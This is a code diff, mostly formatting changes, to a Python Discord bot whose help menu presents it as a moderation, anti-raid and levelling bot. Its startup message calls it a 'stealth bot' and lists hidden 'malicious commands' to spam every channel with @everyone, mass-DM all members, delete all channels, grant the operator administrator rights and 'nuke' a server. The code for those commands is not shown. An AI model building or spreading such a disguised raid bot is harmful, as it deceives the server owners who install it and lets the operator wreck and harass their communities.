@@ -29,7 +29,8 @@ if data.get("prefix").strip().replace(" ", "") == "":
     close = input("")
     os._exit(1)
 bot = commands.Bot(command_prefix=data.get("prefix"))
-status = cycle(['against raiders!', f'{data.get("prefix")}help for commands!'])  # Used in "change_status()".
+# Used in "change_status()".
+status = cycle(['against raiders!', f'{data.get("prefix")}help for commands!'])
 
 # Removes default help command.
 bot.remove_command('help')
@@ -40,23 +41,26 @@ async def create_db_pool():
     try:
         bot.pg_con = await asyncpg.create_pool(database="levels_db", user="postgres", password=data.get("postgresql_password"))
     except:
-        print(Back.RED + Fore.WHITE + "Invalid postgresql password in run_settings.json.")
+        print(Back.RED + Fore.WHITE +
+              "Invalid postgresql password in run_settings.json.")
         close = input("")
         os._exit(1)
-        
+
 
 # Load/Unload/Reload: Used for messing with Cogs.
 @bot.command()
 async def load(ctx, extension):
     bot.load_extension(f'cogs.{extension}')
-    embed=discord.Embed(title="Extension loaded", description=f"{extension} has been loaded.", color=discord.Colour.green())
+    embed = discord.Embed(title="Extension loaded",
+                          description=f"{extension} has been loaded.", color=discord.Colour.green())
     await ctx.send(embed=embed)
 
 
 @bot.command()
 async def unload(ctx, extension):
     bot.unload_extension(f'cogs.{extension}')
-    embed=discord.Embed(title="Extension unloaded", description=f"{extension} has been unloaded.", color=discord.Colour.green())
+    embed = discord.Embed(title="Extension unloaded",
+                          description=f"{extension} has been unloaded.", color=discord.Colour.green())
     await ctx.send(embed=embed)
 
 
@@ -64,7 +68,8 @@ async def unload(ctx, extension):
 async def reload(ctx, extension):
     bot.unload_extension(f'cogs.{extension}')
     bot.load_extension(f'cogs.{extension}')
-    embed=discord.Embed(title="Extension reloaded", description=f"{extension} has been reloaded.", color=discord.Colour.green())
+    embed = discord.Embed(title="Extension reloaded",
+                          description=f"{extension} has been reloaded.", color=discord.Colour.green())
     await ctx.send(embed=embed)
 
 
@@ -73,20 +78,24 @@ async def reload(ctx, extension):
 async def on_ready():
     change_status.start()
     print(Fore.WHITE + 'Your stealth bot is ready to be used, comrade!\n\n')
-    print(Back.GREEN + f'Malicious commands (Type {data.get("prefix")} to view regular commands):\n' + Back.BLACK + Fore.RED + f"{data.get('prefix')}spam: Spam all text channels with @everyone.\n{data.get('prefix')}mass_dm <message>: DM all members on a server a message.\n{data.get('prefix')}cpurge: Delete all channels on a server.\n{data.get('prefix')}admin: Make yourself administrator on a server.\n{data.get('prefix')}nuke: Destroy a server.")
+    print(Back.GREEN + f'Malicious commands (Type {data.get("prefix")} to view regular commands):\n' + Back.BLACK + Fore.RED +
+          f"{data.get('prefix')}spam: Spam all text channels with @everyone.\n{data.get('prefix')}mass_dm <message>: DM all members on a server a message.\n{data.get('prefix')}cpurge: Delete all channels on a server.\n{data.get('prefix')}admin: Make yourself administrator on a server.\n{data.get('prefix')}nuke: Destroy a server.")
 
 
 # On error (error handling).
 @bot.event
 async def on_command_error(ctx, error):
     if isinstance(error, commands.MissingPermissions):
-        embed=discord.Embed(title="Error", description=f"**Permission denied.**", color=discord.Colour.red())
+        embed = discord.Embed(
+            title="Error", description=f"**Permission denied.**", color=discord.Colour.red())
         await ctx.send(embed=embed)
     if isinstance(error, commands.NotOwner):
-        embed=discord.Embed(title="Error", description=f"**You must be the owner to use this command.**", color=discord.Colour.red())
+        embed = discord.Embed(
+            title="Error", description=f"**You must be the owner to use this command.**", color=discord.Colour.red())
         await ctx.send(embed=embed)
     if isinstance(error, commands.CheckFailure):
-        embed=discord.Embed(title="Error", description=f"**Access denied.**", color=discord.Colour.red())
+        embed = discord.Embed(
+            title="Error", description=f"**Access denied.**", color=discord.Colour.red())
         await ctx.send(embed=embed)
     else:
         print(error)
@@ -101,59 +110,81 @@ async def help(ctx):
     embed.set_author(name=f"Here's a list of my commands!")
 
     if not author.guild_permissions.manage_messages and not author.guild_permissions.kick_members and not author.guild_permissions.ban_members and not author.guild_permissions.administrator and not author.guild_permissions.mute_members:
-        embed.add_field(name="**No permissions for moderator commands!**", value="You lack every permission used by the moderator commands.", inline=False)
+        embed.add_field(name="**No permissions for moderator commands!**",
+                        value="You lack every permission used by the moderator commands.", inline=False)
         missing_perms = True
     else:
-        embed.add_field(name="**Moderation:**", value="My moderation commands are:", inline=False)
+        embed.add_field(name="**Moderation:**",
+                        value="My moderation commands are:", inline=False)
         if author.guild_permissions.manage_messages:
-            embed.add_field(name=f"{data.get('prefix')}clear [1-1000]", value="Clears messages from a channel.", inline=False)
+            embed.add_field(
+                name=f"{data.get('prefix')}clear [1-1000]", value="Clears messages from a channel.", inline=False)
         else:
             missing_perms = True
         if author.guild_permissions.kick_members:
-            embed.add_field(name=f"{data.get('prefix')}kick <member> [reason]", value="Kicks a member from the server.", inline=False)
+            embed.add_field(
+                name=f"{data.get('prefix')}kick <member> [reason]", value="Kicks a member from the server.", inline=False)
         else:
             missing_perms = True
         if author.guild_permissions.ban_members:
-            embed.add_field(name=f"{data.get('prefix')}ban <member> [reason]", value="Bans a member from the server.", inline=False)
+            embed.add_field(
+                name=f"{data.get('prefix')}ban <member> [reason]", value="Bans a member from the server.", inline=False)
         else:
             missing_perms = True
         if author.guild_permissions.administrator:
-            embed.add_field(name=f"{data.get('prefix')}unban <member>", value="Unbans a member from the server.", inline=False)
+            embed.add_field(name=f"{data.get('prefix')}unban <member>",
+                            value="Unbans a member from the server.", inline=False)
         else:
             missing_perms = True
         if author.guild_permissions.mute_members:
-            embed.add_field(name=f"{data.get('prefix')}mute <member> [reason]", value="Mutes a member on the server.", inline=False)
-            embed.add_field(name=f"{data.get('prefix')}unmute <member>", value="Unmutes a member on the server.", inline=False)
+            embed.add_field(
+                name=f"{data.get('prefix')}mute <member> [reason]", value="Mutes a member on the server.", inline=False)
+            embed.add_field(name=f"{data.get('prefix')}unmute <member>",
+                            value="Unmutes a member on the server.", inline=False)
         else:
             missing_perms = True
-    
+
     if not author.guild_permissions.mute_members and not author.guild_permissions.administrator:
-        embed.add_field(name="**No permissions for anti-raid commands!**", value="You lack every permission used by the anti-raid commands.", inline=False)
+        embed.add_field(name="**No permissions for anti-raid commands!**",
+                        value="You lack every permission used by the anti-raid commands.", inline=False)
         missing_perms = True
     else:
-        embed.add_field(name="**Anti-Raid:**", value="My anti-raid commands are:", inline=False)
+        embed.add_field(name="**Anti-Raid:**",
+                        value="My anti-raid commands are:", inline=False)
         if author.guild_permissions.administrator:
-            embed.add_field(name=f"{data.get('prefix')}db_add_member <member>", value="Adds a member to my raider database.", inline=False)
-            embed.add_field(name=f"{data.get('prefix')}db_del_member <member>", value="Removes a member from my raider database.", inline=False)
+            embed.add_field(name=f"{data.get('prefix')}db_add_member <member>",
+                            value="Adds a member to my raider database.", inline=False)
+            embed.add_field(name=f"{data.get('prefix')}db_del_member <member>",
+                            value="Removes a member from my raider database.", inline=False)
         else:
             missing_perms = True
         if author.guild_permissions.mute_members:
-            embed.add_field(name=f"{data.get('prefix')}lock", value="Locks down current text channel during a raid.", inline=False)
-            embed.add_field(name=f"{data.get('prefix')}unlock", value="Unlocks current text channel after a raid.", inline=False)
+            embed.add_field(name=f"{data.get('prefix')}lock",
+                            value="Locks down current text channel during a raid.", inline=False)
+            embed.add_field(name=f"{data.get('prefix')}unlock",
+                            value="Unlocks current text channel after a raid.", inline=False)
         else:
             missing_perms = True
-        
-    embed.add_field(name="**Levelling:**", value="My levelling commands are:", inline=False)
-    embed.add_field(name=f"{data.get('prefix')}level", value="Shows your current level and XP.", inline=False)
-    embed.add_field(name=f"{data.get('prefix')}dailyxp", value="Gives you your daily XP.", inline=False)
-    embed.add_field(name="**Status:**", value="My status commands are:", inline=False)
-    embed.add_field(name=f"{data.get('prefix')}latency", value="Shows you my latency in milliseconds (ms).", inline=False)
-    embed.add_field(name="**Surfing:**", value="My surfing commands are:", inline=False)
-    embed.add_field(name=f"{data.get('prefix')}define <word>", value="Shows you the definition of any word.", inline=False)
+
+    embed.add_field(name="**Levelling:**",
+                    value="My levelling commands are:", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}level",
+                    value="Shows your current level and XP.", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}dailyxp",
+                    value="Gives you your daily XP.", inline=False)
+    embed.add_field(name="**Status:**",
+                    value="My status commands are:", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}latency",
+                    value="Shows you my latency in milliseconds (ms).", inline=False)
+    embed.add_field(name="**Surfing:**",
+                    value="My surfing commands are:", inline=False)
+    embed.add_field(name=f"{data.get('prefix')}define <word>",
+                    value="Shows you the definition of any word.", inline=False)
 
     if missing_perms:
-        embed.set_footer(text="Notice: You are missing permissions to view certain commands.")
-    
+        embed.set_footer(
+            text="Notice: You are missing permissions to view certain commands.")
+
     await author.send(embed=embed)
 
 
